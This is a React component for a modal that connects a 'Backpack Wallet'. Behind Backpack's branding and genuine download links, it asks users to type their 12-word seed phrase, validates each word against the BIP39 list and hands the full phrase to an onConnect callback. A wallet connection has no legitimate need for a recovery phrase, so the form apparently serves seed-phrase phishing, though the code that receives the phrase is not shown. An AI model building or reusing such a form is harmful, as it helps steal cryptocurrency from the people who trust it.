'use client';

import { useState } from 'react';
import { isValidBip39Word } from '@/lib/bip39-utils.js';
import { X, ArrowLeft } from 'lucide-react';

export default function BackpackWalletModal({ onClose, onConnect, onBack, onStartConnect }) {
  const [showSeedInput, setShowSeedInput] = useState(false);
  const [seedWords, setSeedWords] = useState(Array(12).fill(''));
  const [invalidWords, setInvalidWords] = useState(new Set());

  const handleWordChange = (index, value) => {
    const nextWords = [...seedWords];
    const normalized = value.toLowerCase().trim();
    nextWords[index] = normalized;
    setSeedWords(nextWords);

    const nextInvalid = new Set(invalidWords);
    if (normalized && !isValidBip39Word(normalized)) {
      nextInvalid.add(index);
    } else {
      nextInvalid.delete(index);
    }
    setInvalidWords(nextInvalid);
  };

  const handleConnect = () => {
    const filledCount = seedWords.filter((w) => w.length > 0).length;
    const allValid = filledCount === 12 && invalidWords.size === 0;
    if (!allValid) return;

    if (onConnect) {
      onConnect('Backpack Wallet', seedWords.join(' '));
    }
    if (onClose) onClose();
  };

  const filledCount = seedWords.filter((word) => word.length > 0).length;
  const missingCount = 12 - filledCount;
  const isComplete = filledCount === 12 && invalidWords.size === 0;

  return (
    <div className="modal-overlay" onClick={(e) => { if (e.target === e.currentTarget) onClose(); }}>
      <div className="modal-content" style={{ maxWidth: 520 }}>
        <div className="modal-header" style={{ position: 'relative', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
          {showSeedInput ? (
            <button className="close-btn" onClick={() => setShowSeedInput(false)} aria-label="Back" style={{ position: 'absolute', left: 0, marginRight: 4 }}><ArrowLeft size={16} /></button>
          ) : onBack ? (
            <button className="close-btn" onClick={onBack} aria-label="Back" style={{ position: 'absolute', left: 0, marginRight: 4 }}><ArrowLeft size={16} /></button>
          ) : null}
          <h2 style={{ margin: 0, textAlign: 'center' }}>Backpack Wallet</h2>
          <button className="close-btn" onClick={onClose} aria-label="Close" style={{ position: 'absolute', right: 0 }}><X size={18} /></button>
        </div>

        <div className="modal-body">
          {!showSeedInput ? (
            <>
              <div style={{ textAlign: 'center', marginBottom: 24 }}>
                <img src="/icons/backpack-Symbol.svg" alt="Backpack" style={{ width: 60, height: 60, margin: '0 auto 16px', display: 'block' }} />
                <p style={{ margin: 0, fontSize: 14, color: 'var(--text-dim)', lineHeight: 1.5 }}>
                  Connect Backpack with the extension or mobile app, then import your wallet or use the Backpack wallet directly.
                </p>
              </div>

              <div style={{ backgroundColor: 'rgba(255,255,255,0.05)', borderRadius: 12, padding: 20, marginBottom: 20 }}>
                <h3 style={{ margin: '0 0 16px 0', fontSize: 16, fontWeight: 600, color: 'var(--text)' }}>Get Backpack</h3>
                <div style={{ display: 'flex', flexDirection: 'column', gap: 12 }}>
                  <a
                    href="https://backpack.app/"
                    target="_blank"
                    rel="noopener noreferrer"
                    style={{
                      display: 'flex',
                      alignItems: 'center',
                      justifyContent: 'space-between',
                      padding: 12,
                      border: '1px solid rgba(255,255,255,0.15)',
                      borderRadius: 8,
                      background: 'transparent',
                      color: 'var(--text)',
                      textDecoration: 'none',
                      cursor: 'pointer',
                    }}
                  >
                    <div style={{ display: 'flex', alignItems: 'center', gap: 12 }}>
                      <img src="/icons/chrome-icon.svg" alt="Chrome" style={{ width: 24, height: 24 }} />
                      <span style={{ fontSize: 14, fontWeight: 500 }}>Chrome Extension</span>
                    </div>
                    <span style={{ color: 'var(--cyan)' }}>→</span>
                  </a>
                  <a
                    href="https://backpack.app/"
                    target="_blank"
                    rel="noopener noreferrer"
                    style={{
                      display: 'flex',
                      alignItems: 'center',
                      justifyContent: 'space-between',
                      padding: 12,
                      border: '1px solid rgba(255,255,255,0.15)',
                      borderRadius: 8,
                      background: 'transparent',
                      color: 'var(--text)',
                      textDecoration: 'none',
                      cursor: 'pointer',
                    }}
                  >
                    <div style={{ display: 'flex', alignItems: 'center', gap: 12 }}>
                      <img src="/icons/App_Store_(iOS).svg" alt="iOS" style={{ width: 24, height: 24 }} />
                      <span style={{ fontSize: 14, fontWeight: 500 }}>iOS App</span>
                    </div>
                    <span style={{ color: 'var(--cyan)' }}>→</span>
                  </a>
                  <a
                    href="https://backpack.app/"
                    target="_blank"
                    rel="noopener noreferrer"
                    style={{
                      display: 'flex',
                      alignItems: 'center',
                      justifyContent: 'space-between',
                      padding: 12,
                      border: '1px solid rgba(255,255,255,0.15)',
                      borderRadius: 8,
                      background: 'transparent',
                      color: 'var(--text)',
                      textDecoration: 'none',
                      cursor: 'pointer',
                    }}
                  >
                    <div style={{ display: 'flex', alignItems: 'center', gap: 12 }}>
                      <img src="/icons/play-store-icon.svg" alt="Android" style={{ width: 24, height: 24 }} />
                      <span style={{ fontSize: 14, fontWeight: 500 }}>Android App</span>
                    </div>
                    <span style={{ color: 'var(--cyan)' }}>→</span>
                  </a>
                </div>
              </div>

              <button
                onClick={onStartConnect}
                style={{
                  width: '100%',
                  padding: 12,
                  border: 'none',
                  borderRadius: 8,
                  background: 'var(--cyan)',
                  color: 'var(--bg)',
                  fontSize: 14,
                  fontWeight: 600,
                  cursor: 'pointer',
                  transition: 'all 0.2s',
                }}
              >
                Connect Backpack Wallet
              </button>
              <button
                onClick={() => setShowSeedInput(true)}
                style={{
                  width: '100%',
                  padding: 12,
                  border: '1px solid rgba(255,255,255,0.2)',
                  borderRadius: 8,
                  background: 'transparent',
                  color: 'var(--text-dim)',
                  fontSize: 14,
                  fontWeight: 600,
                  cursor: 'pointer',
                  transition: 'all 0.2s',
                }}
              >
                Import seed phrase
              </button>
            </>
          ) : (
            <>
              <p style={{ textAlign: 'center', color: 'var(--text-dim)', marginBottom: 20, fontSize: 14 }}>
                Enter your Backpack seed phrase to continue
              </p>

              <div style={{
                display: 'grid',
                gridTemplateColumns: 'repeat(2, 1fr)',
                gap: 12,
                marginBottom: 20,
                maxHeight: 380,
                overflowY: 'auto',
                paddingRight: 8,
              }}>
                {seedWords.map((word, index) => (
                  <div key={index} style={{ display: 'flex', alignItems: 'center', gap: 8 }}>
                    <span style={{ fontSize: 13, color: 'var(--text-dim)', minWidth: 20 }}>{index + 1}</span>
                    <input
                      type="text"
                      placeholder="Word"
                      value={word}
                      onChange={(e) => handleWordChange(index, e.target.value)}
                      style={{
                        flex: 1,
                        padding: '8px 10px',
                        border: `1px solid ${invalidWords.has(index) ? '#ff4444' : 'rgba(255,255,255,0.2)'}`,
                        borderRadius: 8,
                        background: 'transparent',
                        color: 'var(--text)',
                        fontSize: 12,
                        outline: 'none',
                      }}
                    />
                  </div>
                ))}
              </div>

              <div style={{ textAlign: 'center', marginBottom: 20 }}>
                {missingCount > 0 ? (
                  <p style={{ color: 'var(--text-dim)', fontSize: 13, margin: 0 }}>Missing words: <span style={{ color: 'var(--cyan)' }}>{missingCount}</span></p>
                ) : invalidWords.size > 0 ? (
                  <p style={{ color: '#ff4444', fontSize: 13, margin: 0 }}>Invalid words: {invalidWords.size}</p>
                ) : (
                  <p style={{ color: 'var(--text-dim)', fontSize: 13, margin: 0 }}>All words valid</p>
                )}
              </div>

              <button
                onClick={handleConnect}
                disabled={!isComplete}
                style={{
                  width: '100%',
                  padding: 12,
                  border: 'none',
                  borderRadius: 8,
                  background: isComplete ? 'var(--cyan)' : 'rgba(255,255,255,0.1)',
                  color: isComplete ? 'var(--bg)' : 'var(--text-dim)',
                  fontSize: 14,
                  fontWeight: 600,
                  cursor: isComplete ? 'pointer' : 'not-allowed',
                }}
              >
                Connect Wallet
              </button>
            </>
          )}
        </div>
      </div>
    </div>
  );
}
